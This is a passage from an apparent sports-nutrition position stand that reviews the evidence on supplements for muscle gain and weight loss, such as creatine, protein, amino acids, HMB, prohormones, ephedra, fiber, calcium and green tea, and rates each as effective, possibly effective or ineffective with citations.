3 . There is no compelling scientific evidence that the short - or long - term use of creatine monohydrate has any detrimental effects on otherwise healthy individuals .
4 . If proper precautions and supervision are provided , supplementation in young athletes is acceptable and may provide a nutritional alternative to potentially dangerous anabolic drugs .
5 . At present , creatine monohydrate is the most extensively studied and clinically effective form of creatine for use in nutritional supplements in terms of muscle uptake and ability to increase high - intensity exercise capacity .
6 . The addition of carbohydrate or carbohydrate and protein to a creatine supplement appears to increase muscular retention of creatine , although the effect on performance measures may not be greater than using creatine monohydrate alone .
7 . The quickest method of increasing muscle creatine stores appears to be to consume ~ 0.3 grams / kg / day of creatine monohydrate for at least 3 days followed by 3 - 5 g/d thereafter to maintain elevated stores .
Ingesting smaller amounts of creatine monohydrate ( e.g. , 2 - 3 g/d ) will increase muscle creatine stores over a 3 - 4 week period , however , the performance effects of this method of supplementation are less supported .
8 . Creatine monohydrate has been reported to have a number of potentially beneficial uses in several clinical populations , and further research is warranted in these areas .
Protein
As previously described , research has indicated that people undergoing intense training may need additional protein in their diet to meet protein needs ( i.e. , 1.4 - 2.0 grams / day [ 13 , 39 ] .
People who do not ingest enough protein in their diet may exhibit slower recovery and training adaptations [ 33 ] .
Protein supplements offer a convenient way to ensure that athletes consume quality protein in the diet and meet their protein needs .
However , ingesting additional protein beyond that necessary to meet protein needs does not appear to promote additional gains in strength and muscle mass .
The research focus over recent years has been to determine whether different types of protein ( e.g. , whey , casein , soy , milk proteins , colostrum , etc ) and / or various biologically active protein subtypes and peptides ( e.g. , α- lactalbumin , β- lactoglobulin , glycomacropeptides , immunoglobulins , lactoperoxidases , lactoferrin , etc ) have varying effects on the physiological , hormonal , and / or immunological responses to training [ 88 –91 ] .
In addition , a significant amount of research has examined whether timing of protein intake and / or provision of specific amino acids may play a role in protein synthesis and / or training adaptations , conducted mostly in untrained populations [ 92–105 ] .
Although more research is necessary in this area , evidence clearly indicates that protein needs of individuals engaged in intense training are elevated , different types of protein have varying effects on anabolism and catabolism , that different types of protein subtypes and peptides have unique physiological effects , and timing of protein intake may play an important role in optimizing protein synthesis following exercise .
Therefore , it is simplistic and misleading to suggest that there is no data supporting contentions that athletes need more protein in their diet and / or there is no potential ergogenic value of incorporating different types of protein into the diet .
It is the position stand of ISSN that exercising individuals need approximately 1.4 to 2.0 grams of protein per kilogram of bodyweight per day .
This is greater than the RDA recommendations for sedentary individuals .
According to the current literature we know that the addition of protein and or BCAA before or after resistance training can increase protein synthesis and gains in lean mass beyond normal adaptation .
However , it should be noted that gains have primarily been observed in untrained populations unless the supplement contained other nutrients like creatine monohydrate [ 13 , 39 ] .
Essential Amino Acids ( EAA )
Recent studies have indicated that ingesting 3 to 6 g of EAA prior to [ 105 , 106 ] and / or following exercise stimulates protein synthesis [ 92 , 93 , 98 –101 , 105 ] .
Theoretically , this may enhance gains in muscle mass during training .
To support this theory , a study by Esmarck and colleagues [ 107 ] found that ingesting EAA with carbohydrate immediately following resistance exercise promoted significantly greater training adaptations in elderly , untrained men , as compared to waiting until 2 - hours after exercise to consume the supplement .
Although more data is needed , there appears to be strong theoretical rationale and some supportive evidence that EAA supplementation may enhance protein synthesis and training adaptations .
Because EAA 's include BCAA 's , it is probable that positive effects on protein synthesis from EAA ingestion are likely due to the BCAA content [ 108 , 109 ] .
Garlick and Grant [ 109 ] infused glucose into growing rats to achieve a concentration of insulin secretion that was insufficient to stimulate protein synthesis by itself .
In addition to this , all eight essential amino acids with glucose was infused into another group and then in a third group the investigators only infused the BCAA 's along with the glucose .
Compared with the glucose infusion alone , protein synthesis was stimulated equally by the essential amino acids and the BCAAs .
This demonstrates that the BCAAs are the key amino acids that stimulate protein synthesis .
The ISSN position stand on protein concluded that BCAAs have been shown to acutely stimulate protein synthesis , aid in glycogen resynthesis , delaying the onset of fatigue , and help maintain mental function in aerobic - based exercise .
It was concluded that consuming BCAAs ( in addition to carbohydrates ) before , during , and following an exercise bout would be recommended safe and effective [ 39 ] .
Possibly Effective
β - hydroxy β- methylbutyrate ( HMB )
HMB is a metabolite of the amino acid leucine .
Leucine and metabolites of leucine have been reported to inhibit protein degradation [ 110 ] .
Supplementing the diet with 1.5 to 3 g/d of calcium HMB during training has been typically reported to increase muscle mass and strength particularly among untrained subjects initiating training [ 111 –116 ] and the elderly [ 117 ] .
Gains in muscle mass are typically 0.5 to 1 kg greater than controls during 3 - 6 weeks of training .
There is also evidence that HMB may lessen the catabolic effects of prolonged exercise [ 118 , 119 ] and that there may be additive effects of co-ingesting HMB with creatine [ 120 , 121 ] .
However , the effects of HMB supplementation in athletes are less clear .
Most studies conducted on trained subjects have reported non-significant gains in muscle mass possibly due to a greater variability in response of HMB supplementation among athletes [ 122–124 ] .
Consequently , there is fairly good evidence showing that HMB may enhance training adaptations in individuals initiating training .
However , additional research is necessary to determine whether HMB may enhance training adaptations in trained athletes .
Branched Chain Amino Acids ( BCAA )
BCAA supplementation has been reported to decrease exercise - induced protein degradation and / or muscle enzyme release ( an indicator of muscle damage ) possibly by promoting an anti-catabolic hormonal profile [ 31 , 51 , 125 ] .
Theoretically , BCAA supplementation during intense training may help minimize protein degradation and thereby lead to greater gains in fat - free mass .
There is some evidence to support this hypothesis .
For example , Schena and colleagues [ 126 ] reported that BCAA supplementation ( ~10 g/d ) during 21 - days of trekking at altitude increased fat free mass ( 1.5 % ) while subjects ingesting a placebo had no change in muscle mass .
Bigard and associates [ 127 ] reported that BCAA supplementation appeared to minimize loss of muscle mass in subjects training at altitude for 6 - weeks .
Finally , Candeloro and coworkers [ 128 ] reported that 30 days of BCAA supplementation ( 14 grams / day ) promoted a significant increase in muscle mass ( 1.3 % ) and grip strength ( + 8.1 % ) in untrained subjects .
A recent published abstract [ 129 ] reported that resistance trained subjects ingesting 14 grams of BCAA during 8 weeks of resistance training experienced a significantly greater gain in body weight and lean mass as compared to a whey protein supplemented group and a carbohydrate placebo group .
Specifically , the BCAA group gained 2 kg of body mass and 4 kg of lean body mass .
In contrast , the whey protein and carbohydrate groups both gained an additional 1 kg of body mass and 2 kg and 1 kg of lean body mass , respectively .
It can not be overstated that this investigation was published as an abstract , was conducted in a gym setting , and has not undergone the rigors of peer review at this time .
Although more research is necessary , these findings suggest that BCAA supplementation may have some impact on body composition .
Too Early to Tell
α-ketoglutarate ( α - KG )
α-KG is an intermediate in the Krebs cycle that is involved in aerobic energy metabolism .
There is some clinical evidence that α-KG may serve as an anticatabolic nutrient after surgery [ 130 , 131 ] .
However , it is unclear whether α- KG supplementation during training may affect training adaptations .
α-Ketoisocaproate ( KIC )
KIC is a branched - chain keto acid that is a metabolite of leucine metabolism .
In a similar manner as HMB , leucine and metabolites of leucine are believed to possess anticatabolic properties [ 132 ] .
There is some clinical evidence that KIC may spare protein degradation in clinical populations [ 133 , 134 ] .
Theoretically , KIC may help minimize protein degradation during training possibly leading to greater training adaptations .
However , we are not aware of any studies that have evaluated the effects of KIC supplementation during training on body composition .
Ecdysterones
Ecdysterones ( also known as ectysterone , 20 Beta - Hydroxyecdysterone , turkesterone , ponasterone , ecdysone , or ecdystene ) are naturally derived phytoecdysteroids ( i.e. , insect hormones ) .
They are typically extracted from the herbs Leuza rhaptonticum sp. , Rhaponticum carthamoides , or Cyanotis vaga .
They can also be found in high concentrations in the herb Suma ( also known as Brazilian Ginseng or Pfaffia ) .
Research from Russia and Czechoslovakia conducted over the last 30 years indicates that ecdysterones may possess some potentially beneficial physiological effects in insects and animals [ 135 –140 ] .
However , since most of the data on ecdysterones have been published in obscure journals , results are difficult to interpret .
Wilborn and coworkers [ 141 ] gave resistance trained males 200 mg of 20 - hydroxyecdysone per day during 8 - weeks of resistance training .
It was reported that the 20 - hydroxyecdysone supplementation had no effect on fat free mass or anabolic / catabolic hormone status [ 141 ] .
Due to the findings of this well controlled study in humans , ecdysterone supplementation at a dosage of 200 mg per day appears to be ineffective in terms of improving lean muscle mass .
While future studies may find some ergogenic value of ecdysterones , it is our view that it is too early to tell whether phytoecdysteroids serve as a safe and effective nutritional supplement for athletes .
Growth Hormone Releasing Peptides ( GHRP ) and Secretagogues
Research has indicated that growth hormone releasing peptides ( GHRP ) and other non-peptide compounds ( secretagogues ) appear to help regulate growth hormone ( GH ) release [ 142 , 143 ] .
These observations have served as the basis for development of nutritionally - based GH stimulators ( e.g. , amino acids , pituitary peptides , " pituitary substances " , Macuna pruriens , broad bean , alpha - GPC , etc ) .
Although there is clinical evidence that pharmaceutical grade GHRP's and some non-peptide secretagogues can increase GH and IGF - 1 levels at rest and in response to exercise , it has not been demonstrated that such increases lead to an increase in skeletal muscle mass [ 144 ] .
Ornithine - α- ketoglutarate ( OKG )
OKG ( via enteral feeding ) has been shown to significantly shorten wound healing time and improve nitrogen balance in severe burn patients [ 145 , 146 ] .
Because of its ability to improve nitrogen balance , OKG may provide some value for athletes engaged in intense training .
A study by Chetlin and colleagues [ 147 ] reported that OKG supplementation ( 10 grams / day ) during 6 - weeks of resistance training promoted greater gains in bench press .
However , no significant differences were observed in squat strength , training volume , gains in muscle mass , or fasting insulin and growth hormone .
Therefore , additional research is needed before conclusions can be drawn .
Zinc / Magnesium Aspartate ( ZMA )
The main ingredients in ZMA formulations are zinc monomethionine aspartate , magnesium aspartate , and vitamin B - 6 .
The rationale of ZMA supplementation is based on studies suggesting that zinc and magnesium deficiency may reduce the production of testosterone and insulin like growth factor ( IGF - 1 ) .
ZMA supplementation has been theorized to increase testosterone and IGF - 1 leading to greater recovery , anabolism , and strength during training .
In support of this theory , Brilla and Conte [ 148 ] reported that a zinc - magnesium formulation increased testosterone and IGF - 1 ( two anabolic hormones ) leading to greater gains in strength in football players participating in spring training .
In another study conducted by Wilborn et al. [ 149 ] , resistance trained males ingested a ZMA supplement and found no such increases in either total or free testosterone .
In addition , this investigation also assessed changes in fat free mass and no significant differences were observed in relation to fat free mass in those subjects taking ZMA .
The discrepancies concerning the two aforementioned studies may be explained by deficiencies of these minerals .
Due to the role that zinc deficiency plays relative to androgen metabolism and interaction with steroid receptors [ 150 ] , when there are deficiencies of this mineral , testosterone production may suffer .
In the study showing increases in testosterone levels [ 148 ] , there were depletions of zinc and magnesium in the placebo group over the duration of the study .
Hence , increases in testosterone levels could have been attributed to impaired nutritional status rather than a pharmacologic effect .
More research is needed to further evaluate the role of ZMA on body composition and strength during training before definitive conclusions can be drawn .
Apparently Ineffective
Glutamine
Glutamine is the most plentiful non-essential amino acid in the body and plays a number of important physiological roles [ 31 , 108 , 109 ]
Glutamine has been reported to increase cell volume and stimulate protein [ 151 , 152 ] and glycogen synthesis [ 153 ] .
Despite its important role in physiological roles , there is no compelling evidence to support glutamine supplementation in terms of increasing lean body mass .
One study that is often cited in support of glutamine supplementation and its role in increasing muscle mass was published by Colker and associates [ 154 ] .
It was reported that subjects who supplemented their diet with glutamine ( 5 grams ) and BCAA ( 3 grams ) enriched whey protein during training promoted about a 2 pound greater gain in muscle mass and greater gains in strength than ingesting whey protein alone .
While a 2 pound increase in lean body mass was observed , it is likely that these gains were due to the BCAAs that were added to the whey protein .
In a well - designed investigation , Candow and co-workers [ 155 ] studied the effects of oral glutamine supplementation combined with resistance training in young adults .
Thirty - one participants were randomly allocated to receive either glutamine ( 0.9 g/kg of lean tissue mass ) or a maltodextrin placebo ( 0.9 g/kg of lean tissue mass ) during 6 weeks of total body resistance training .
At the end of the 6 - week intervention , the authors concluded glutamine supplementation during resistance training had no significant effect on muscle performance , body composition or muscle protein degradation in young healthy adults .
While there may be other beneficial uses for glutamine supplementation , there does not appear to be any scientific evidence that it supports increases in lean body mass or muscular performance .
Smilax officinalis ( SO )
SO is a plant that contains plant sterols purported to enhance immunity as well as provide an androgenic effect on muscle growth [ 1 ] .
Some data supports the potential immune enhancing effects of SO .
However , we are not aware of any data that show that SO supplementation increases muscle mass during training .
Isoflavones
Isoflavones are naturally occurring non-steroidal phytoestrogens that have a similar chemical structure as ipriflavone ( a synthetic flavonoid drug used in the treatment of osteoporosis ) [ 156–158 ] .
For this reason , soy protein ( which is an excellent source of isoflavones ) and isoflavone extracts have been investigated in the possible treatment of osteoporosis .
Results of these studies have shown promise in preventing declines in bone mass in post - menopausal women as well as reducing risks to side effects associated with estrogen replacement therapy .
More recently , the isoflavone extracts 7 - isopropoxyisoflavone ( ipriflavone ) and 5 - methyl - 7 - methoxy - isoflavone ( methoxyisoflavone ) have been marketed as " powerful anabolic " substances .
These claims have been based on research described in patents filed in Hungary in the early 1970s [ 159 , 160 ] .
Aubertin - Leheudre M , et al. [ 161 ] investigated the effects that isoflavone supplementation would have on fat - free mass in obese , sarcopenic postmenopausal women .
Eighteen sarcopenic - obese women ingested 70 mg of isoflavones per day ( 44 mg of daidzein , 16 mg glycitein and 10 mg genistein ) or a placebo for six months .
There was no exercise intervention in the investigation , only the isoflavone supplementation .
At the end of the six month intervention , it was reported that there was no difference in total body fat free mass between the isoflavone and placebo groups , but there was a significant increase in the appendicular ( arms and legs ) fat free mass in the isoflavone supplemented group but not the placebo group .
Findings from this study have some applications to sedentary , postmenopausal women .
However , there are currently no peer - reviewed data indicating that isoflavone supplementation affects exercise , body composition , or training adaptations in physically active individuals .
Sulfo - Polysaccharides ( Myostatin Inhibitors )
Myostatin or growth differentiation factor 8 ( GDF - 8 ) is a transforming growth factor that has been shown to serve as a genetic determinant of the upper limit of muscle size and growth [ 162 ] .
Recent research has indicated that eliminating and / or inhibiting myostatin gene expression in mice [ 163 ] and cattle [ 164 –166 ] promotes marked increases in muscle mass during early growth and development .
The result is that these animals experience what has been termed as a " double - muscle " phenomenon apparently by allowing muscle to grow beyond its normal genetic limit .
In agriculture research , eliminating and / or inhibiting myostatin may serve as an effective way to optimize animal growth leading to larger , leaner , and a more profitable livestock yield .
In humans , inhibiting myostatin gene expression has been theorized as a way to prevent or slow down muscle wasting in various diseases , speed up recovery of injured muscles , and / or promote increases in muscle mass and strength in athletes [ 167 ] .
While these theoretical possibilities may have great promise , research on the role of myostatin inhibition on muscle growth and repair is in the very early stages - particularly in humans .
There is some evidence that myostatin levels are higher in the blood of HIV positive patients who experience muscle wasting and that myostatin levels negatively correlate with muscle mass [ 162 ] .
There is also evidence that myostatin gene expression may be fiber specific and that myostatin levels may be influenced by immobilization in animals [ 168 ] .
Additionally , a study by Ivey and colleagues [ 167 ] reported that female athletes with a less common myostatin allele ( a genetic subtype that may be more resistant to myostatin ) experienced greater gains in muscle mass during training and less loss of muscle mass during detraining .
No such pattern was observed in men with varying amounts of training histories and muscle mass .
These early studies suggest that myostatin may play a role in regulating muscle growth to some degree .
Some nutrition supplement companies have marketed sulfo - polysaccharides ( derived from a sea algae called Cytoseira canariensis ) as a way to partially bind the myostatin protein in serum .
When untrained males supplemented with 1200 mg / day of Cystoseira canariensis in conjunction with a twelve week resistance training regimen , it was reported that there were no differences between the supplemented group and the placebo group in relation to fat - free mass , muscle strength , thigh volume / mass , and serum myostatin [ 169 ] .
Interestingly , a recent paper by Seremi and colleagues [ 170 ] reported that resistance training reduced serum myostatin levels and that creatine supplementation in conjunction with resistance training promoted further reductions .
Nevertheless , though the research is limited , there is currently no published data supporting the use of sulfo - polysaccharides as a muscle building supplement .
Boron
Boron is a trace mineral proposed to increase testosterone levels and promote anabolism .
Several studies have evaluated the effects of boron supplementation during training on strength and body composition alterations .
These studies ( conducted on male bodybuilders ) indicate that boron supplementation ( 2.5 mg /d ) appears to have no impact on muscle mass or strength [ 171 , 172 ] .
Chromium
Chromium is a trace mineral that is involved in carbohydrate and fat metabolism .
Clinical studies have suggested that chromium may enhance the effects of insulin particularly in diabetic populations .
Since insulin is an anti-catabolic hormone and has been reported to affect protein synthesis , chromium supplementation has been theorized to serve as an anabolic nutrient .
Theoretically , this may increase anabolic responses to exercise .
Although some initial studies reported that chromium supplementation increased gains in muscle mass and strength during training particularly in women [ 173 –175 ] , most well - controlled studies [ 176 ] that have been conducted since then have reported no benefit in healthy individuals taking chromium ( 200 - 800 mcg/d ) for 4 to 16 - weeks during training [ 177–183 ] .
Consequently , it appears that although chromium supplementation may have some therapeutic benefits for diabetics , chromium does not appear to be a muscle - building nutrient for athletes .
Conjugated Linoleic Acids ( CLA )
Animal studies indicate that adding CLA to dietary feed decreases body fat , increases muscle and bone mass , has anti-cancer properties , enhances immunity , and inhibits progression of heart disease [ 184–186 ] .
Consequently , CLA supplementation in humans has been suggested to help manage body composition , delay loss of bone , and provide health benefit .
Although animal studies are impressive [ 187–189 ] and some studies suggests benefit over time at some but not all dosages [ 190 –192 ] , there is little current evidence that CLA supplementation during training can affect lean tissue accretion [ 193 , 194 ] .
As will be discussed below , there appears to be more promise of CLA as a supplement to promote general health and / or reductions in fat mass over time .
Gamma Oryzanol ( Ferulic Acid )
Gamma oryzanol is a plant sterol theorized to increase anabolic hormonal responses during training [ 195 ] .
Although data are limited , one study reported no effect of 0.5 g/d of gamma oryzanol supplementation on strength , muscle mass , or anabolic hormonal profiles during 9 - weeks of training [ 196 ] .
Prohormones
Testosterone and growth hormone are two primary hormones in the body that serve to promote gains in muscle mass ( i.e. , anabolism ) and strength while decreasing muscle breakdown ( catabolism ) and fat mass [ 197–204 ] .
Testosterone also promotes male sex characteristics ( e.g. , hair , deep voice , etc ) [ 198 ] .
Low level anabolic steroids are often prescribed by physicians to prevent loss of muscle mass for people with various diseases and illnesses [ 205 –216 ] .
It is well known that athletes have experimented with large doses of anabolic steroids in an attempt to enhance training adaptations , increase muscle mass , and / or promote recovery during intense training [ 198 –200 , 203 , 204 , 217 ] .
Research has generally shown that use of anabolic steroids and growth hormone during training can promote gains in strength and muscle mass [ 197 , 202 , 204 , 210 , 213 , 218–225 ] .
However , a number of potentially life threatening adverse effects of steroid abuse have been reported including liver and hormonal dysfunction , hyperlipidemia ( high cholesterol ) , increased risk to cardiovascular disease , and behavioral changes ( i.e. , steroid rage ) [ 220 , 226–230 ] .
Some of the adverse effects associated with the use of these agents are irreversible , particularly in women [ 227 ] .
For this reason , anabolic steroids have has been banned by most sport organizations and should be avoided unless prescribed by a physician to treat an illness .
Prohormones ( androstenedione , 4 - androstenediol , 19 - nor-4-androstenedione , 19 - nor - 4- androstenediol , 7 - keto DHEA , and DHEA , etc ) are naturally derived precursors to testosterone or other anabolic steroids .
Prohormones have become popular among body builders because they believe they are natural boosters of anabolic hormones .
Consequently , a number of over - the - counter supplements contain prohormones .
While there is some data indicating that prohormones increase testosterone levels [ 231 , 232 ] , there is virtually no evidence that these compounds affect training adaptations in younger men with normal hormone levels .
In fact , most studies indicate that they do not affect testosterone and that some may actually increase estrogen levels and reduce HDL - cholesterol [ 220 , 231 , 233–238 ] .
Consequently , although there may be some potential applications for older individuals to replace diminishing androgen levels , it appears that prohormones have no training value .
Since prohormones are " steroid - like compounds " , most athletic organizations have banned their use .
Use of nutritional supplements containing prohormones will result in a positive drug test for anabolic steroids .
Use of supplements knowingly or unknowingly containing prohormones have been believed to have contributed to a number of recent positive drug tests among athletes .
Consequently , care should be taken to make sure that any supplement an athlete considers taking does not contain prohormone precursors particularly if their sport bans and tests for use of such compounds .
It is noteworthy to mention that many prohormones are not lawful for sale in the USA since the passage of the Anabolic Steroid Control Act of 2004 .
The distinctive exception to this is DHEA , which has been the subject of numerous clinical studies in aging populations .
Rather than provide the body with a precursor to testosterone , a more recent technique to enhance endogenous testosterone has been to inhibit aromatase activity [ 239 ] .
Two studies have investigated the effects of aromatase inhibitors ( androst - 4 - ene - 3,6,17 - trione ) [ 240 ] and ( hydroxyandrost-4-ene-6,17-dioxo-3- THP ether and 3,17 - diketo- androst-1,4,6- triene ) [ 241 ] .
In both of these investigations , it was reported that free testosterone and dihydrotesterone levels were significantly increased .
Muscle mass / fat free mass was not measured in one investigation [ 240 ] and no changes were observed in fat free mass in the other investigation [ 241 ] .
Tribulus terrestris
Tribulus terrestris ( also known as puncture weed / vine or caltrops ) is a plant extract that has been suggested to stimulate leutinizing hormone ( LH ) which stimulates the natural production of testosterone [ 132 ] .
Consequently , Tribulus has been marketed as a supplement that can increase testosterone and promote greater gains in strength and muscle mass during training .
Several recent studies have indicated that Tribulus supplementation appears to have no effects on body composition or strength during training [ 242–244 ] .
Vanadyl Sulfate ( Vanadium )
In a similar manner as chromium , vanadyl sulfate is a trace mineral that has been found to affect insulin- sensitivity and may affect protein and glucose metabolism [ 132 , 245 ] .
For this reason , vanadyl sulfate has been purported to increase muscle mass and strength during training .
Although there may be some clinical benefits for diabetics ( with a therapeutic dose of at least 50 mg vanadyl sulfate twice daily [ 246 , 247 ] , vanadyl sulfate supplementation does not appear to have any effect on strength or muscle mass during training in non-diabetic , weight training individuals [ 248 , 249 ] .
Weight Loss Supplements
Although exercise and proper diet remain the best way to promote weight loss and / or manage body composition , a number of nutritional approaches have been investigated as possible weight loss methods ( with or without exercise ) .
The following overviews the major types of weight loss products available and discusses whether any available research supports their use .
See Table 3 for a summary .
Apparently Effective
Low Calorie Diet Foods & Supplements
Most of the products in this category represent low fat / carbohydrate , high protein food alternatives [ 250 ] .
They typically consist of pre-packaged food , bars , MRP , or RTD supplements .
They are designed to provide convenient foods / snacks to help people follow a particular low calorie diet plan .
In the scientific literature , diets that provide less than 1000 calories per day are known as very low calorie diets ( VLCD's ) .
Pre -packaged food , MRP's , and / or RTD's are often provided in VLCD plans to help people cut calories .
In most cases , VLCD plans recommend behavioural modification and that people start a general exercise program .
Research on the safety and efficacy of people maintaining VLCD 's generally indicate that they can promote weight loss .
For example , Hoie et al [ 251 ] reported that maintaining a VLCD for 8 - weeks promoted a 27 lbs ( 12.6 % ) loss in total body mass , a 21 lbs loss in body fat ( 23.8 % ) , and a 7 lbs ( 5.2 % ) loss in lean body mass in 127 overweight volunteers .
Bryner and colleagues [ 252 ] reported that addition of a resistance training program while maintaining a VLCD ( 800 kcal / d for 12 - weeks ) resulted in a better preservation of lean body mass and resting metabolic rate compared to subjects maintaining a VLCD while engaged in an endurance training program .
Meckling and Sherfey [ 253 ] reported that the combination of high protein and exercise was the most effective intervention for weight loss and was superior to a low - fat , high - carbohydrate diet in promoting weight loss and nitrogen balance regardless of the presence of an exercise intervention .
Recent studies indicate that high protein / low fat VLCD 's may be better than high carbohydrate / low fat diets in promoting weight loss [ 46 , 253–260 ] .
The reason for this is that typically when people lose weight about 40 - 50 % of the weight loss is muscle which decreases resting energy expenditure .
Increasing protein intake during weight loss helps preserve muscle mass and resting energy expenditure to a better degree than high carbohydrate diets [ 261 , 262 ] .
These findings and others indicate that VLCD 's ( typically using MRP 's and / or RTD's as a means to control caloric intake ) can be effective particularly as part of an exercise and behavioural modification program .
Most people appear to maintain at least half of the initial weight lost for 1 - 2 years but tend to regain most of the weight back within 2 - 5 years .
Therefore , although these diets may help people lose weight on the short - term , it is essential people who use them follow good diet and exercise practices in order to maintain the weight loss .
The addition of dietary protein whether in whole food form or meal replacement form could assist in this weight maintenance due to the fact that the retention of muscle mass is greater than in high carbohydrate / low - fat weight loss trials ?
Ephedra , Caffeine , and Silicin
Thermogenics are supplements designed to stimulate metabolism thereby increasing energy expenditure and promote weight loss .
They typically contain the " ECA " stack of ephedra alkaloids ( e.g. , Ma Haung , 1R,2S Nor-ephedrine HCl , Sida Cordifolia ) , caffeine ( e.g. , Gaurana , Bissey Nut , Kola ) and aspirin / salicin ( e.g. , Willow Bark Extract ) .
The first of the three traditional thermogenics is now banned by the FDA however the safety associated with the ingestion of ephedra is debated .
More recently , other potentially thermogenic nutrients have been added to various thermogenic formulations .
For example , thermogenic supplements may also contain synephrine ( e.g. , Citrus Aurantum , Bitter Orange ) , calcium & sodium phosphate , thyroid stimulators ( e.g. , guggulsterones , L - tyrosine , iodine ) , cayenne & black pepper , and ginger root .
A significant amount of research has evaluated the safety and efficacy of EC and ECA type supplements .
According to a meta- analysis in the Journal of American Medical Association , ephedrine / ephedra promote a more substantial weight loss 0.9 kg per month in comparison to placebo in clinical trials but are associated with increased risk of psychiatric , autonomic or gastrointestinal symptoms as well as heart palpitations .
Several studies have confirmed that use of synthetic or herbal sources of ephedrine and caffeine ( EC ) promote about 2 lbs of extra weight loss per month while dieting ( with or without exercise ) and that EC supplementation is generally well tolerated in healthy individuals [ 263–274 ] .
For example , Boozer et al [ 267 ] reported that 8 - weeks of ephedrine ( 72 mg/d ) and caffeine ( 240 mg /d ) supplementation promoted a 9 lbs loss in body mass and a 2.1 % loss in body fat with minor side effects .
Hackman and associates [ 275 ] reported that a 9 month clinical trial utilizing a multi-nutrient supplement containing 40 mg/d of ephedra alkaloids and 100 mg / day caffeine resulted in a loss of weight and body fat , improved metabolic parameters including insulin sensitivity without any apparent side effects .
Interestingly , Greenway and colleagues [ 274 ] reported that EC supplementation was a more cost - effective treatment for reducing weight , cardiac risk , and LDL cholesterol than several weight loss drugs ( fenfluramine with mazindol or phentermine ) .
Finally , Boozer and associates [ 268 ] reported that 6 - months of herbal EC supplementation promoted weight loss with no clinically significant adverse effects in healthy overweight adults .
Less is known about the safety and efficacy of synephrine , thyroid stimulators , cayenne / black pepper and ginger root .
Despite these findings , the Food and Drug Administration ( FDA ) banned the sale of ephedra containing supplements .
The rationale has been based on reports to adverse event monitoring systems and in the media suggesting a link between intake of ephedra and a number of severe medical complications ( e.g. , high blood pressure , elevated heart rate , arrhythmias , sudden death , heat stroke , etc ) [ 276 , 277 ] .
Although results of available clinical studies do not show these types of adverse events , ephedra is no longer available as an ingredient in dietary supplements and thus cannot be recommended for use .
Consequently , thermogenic supplements now contain other nutrients believed to increase energy expenditure ( e.g. , synephrine , green tea , etc ) and are sold as " ephedrine - free " types of products .
Anyone contemplating taking thermogenic supplements should carefully consider the potential side effects , discuss possible use with a knowledgeable physician , and be careful not to exceed recommended dosages .
Possibly Effective
High Fiber Diets
One of the oldest and most common methods of suppressing the appetite is to consume a diet that is high in fiber .
Ingesting high fiber foods ( fruits , vegetables ) or fiber containing supplements ( e.g. , glucomannan ) increase the feeling of fullness ( satiety ) which typically allows an individual to feel full while ingesting fewer calories .
Theoretically , maintaining a high fiber diet may serve to help decrease the amount of food you eat .
In addition , high fiber diets / supplements help lower cholesterol and blood pressure , enhance insulin sensitivity , and promote weight loss in obese subjects [ 278 ] .
A recent study found that a Mediterranean diet that was high in fiber resulted in a more dramatic weight loss that a traditional low - fat diet and had beneficial effects on glycemic control [ 279 ] .
Other research on high fiber diets indicates that they provide some benefit , particularly in diabetic populations .
For example , Raben et al [ 280 ] reported that subjects maintaining a low fat / high fiber diet for 11 weeks lost about 3 lbs of weight and 3.5 lbs of fat .
Other studies have reported mixed results on altering body composition using various forms of higher fiber diets [ 281–284 ] .
Consequently , although maintaining a low fat / high fiber diet that is high in fruit and vegetable content has various health benefits , these diets seem to have potential to promote weight loss as well as weight maintenance thus we can recommend high fiber diets as a safe and healthy approach to possibly improve body composition .
Calcium
Several studies and recent reviews have reported that calcium supplementation alone or in combination with other ingredients does not affect weight loss or fat loss [ 285 –290 ] .
Research has indicated that calcium modulates 1,25 - diydroxyvitamin D which serves to regulate intracellular calcium levels in fat cells [ 291 , 292 ] .
Increasing dietary availability of calcium reduces 1,25 - diydroxyvitamin D and promotes reductions in fat mass in animals [ 292–294 ] .
Dietary calcium has been shown to suppress fat metabolism and weight gain during periods of high caloric intake [ 291 , 293 , 295 ] .
Further , increasing calcium intake has been shown to increase fat metabolism and preserve thermogenesis during caloric restriction [ 291 , 293 , 295 ] .
In support of this theory , Davies and colleagues [ 296 ] reported that dietary calcium was negatively correlated to weight and that calcium supplementation ( 1,000 mg /d ) accounted for an 8 kg weight loss over a 4 yr period .
Additionally , Zemel and associates [ 291 ] reported that supplemental calcium ( 800 mg/d ) or high dietary intake of calcium ( 1,200 - 1,300 mg/d ) during a 24 - week weight loss program promoted significantly greater weight loss ( 26 - 70 % ) and dual energy x-ray absorptiometer ( DEXA ) determined fat mass loss ( 38 - 64 % ) compared to subjects on a low calcium diet ( 400 - 500 mg / d ) .
These findings and others suggest a strong relationship between calcium intake and fat loss .
However , more research needs to be conducted before definitive conclusions can be drawn .
Green Tea Extract
Green tea is now one of the most common herbal supplements that is being added to thermogenic products because it has been suggested to affect weight loss and is now the fourth most commonly used dietary supplement in the US [ 297 ] .
Green tea contains high amounts of caffeine and catechin polyphenols .
The primary catechin that is associated to the potential effects on weight loss through diet induced thermogenesis is the catechin epigallocatechin gallate , also known as EGCG [ 298 , 299 ] .
Research suggests that catechin polyphenols possess antioxidant properties and the intake of tea catechins is associated with a reduced risk of cardiovascular disease [ 298–300 ] .
In addition , green tea has also been theorized to increase energy expenditure by stimulating brown adipose tissue thermogenesis .
In support of this theory , Dulloo et al [ 301 , 302 ] reported that green tea supplementation in combination with caffeine ( e.g. , 50 mg caffeine and 90 mg epigallocatechin gallate taken 3 - times per day ) significantly increased 24 - hour energy expenditure and fat utilization in humans to a much greater extent than when an equivalent amount of caffeine was evaluated suggesting a synergistic effect .
Recently , work by Di Pierro and colleagues [ 303 ] reported that the addition of a green tea extract to a hypocaloric diet resulted in a significant increase in weight loss ( 14 kg vs. 5 kg ) versus a hypocaloric diet alone over a 90 day clinical trial .
Maki and coworkers [ 304 ] also demonstrated that green tea catechin consumption enhanced the exercise - induced changes in abdominal fat .
However , it must be noted that both human and animal studies have not supported these findings and have reported that supplementation of these extracts does not affect weight loss [ 305 , 306 ] .
Theoretically , increases in energy expenditure may help individuals lose weight and / or manage body composition .
Conjugated Linoleic Acids ( CLA )
CLA is a term used to describe a group of positional and geometric isomers of linoleic acid that contain conjugated double bonds .
Adding CLA to the diet has been reported to possess significant health benefits in animals [ 184 , 307 ] .
In terms of weight loss , CLA feedings to animals have been reported to markedly decrease body fat accumulation [ 185 , 308 ] .
Consequently , CLA has been marketed as a health and weight loss supplement since the mid 1990s .
Despite the evidence in animal models , the effect of CLA supplementation in humans is less clear .
